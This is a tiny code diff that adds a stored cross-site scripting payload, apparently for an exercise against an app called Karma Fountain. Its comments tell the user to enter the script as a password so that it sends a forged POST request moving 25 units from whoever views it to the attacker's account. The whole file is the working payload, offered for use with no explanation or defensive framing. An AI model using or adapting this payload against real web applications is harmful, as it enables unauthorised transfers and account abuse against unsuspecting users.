@@ -1,0 +1,4 @@
+//Enter the following line as the password for a user. It will initiate a POST request back to your account from Karma Fountain
+//Replace USER with your user name
+
+<script>var xmlhttp=new XMLHttpRequest();xmlhttp.open("POST","transfer",true);xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");xmlhttp.send("to=USER&amount=25");</script>
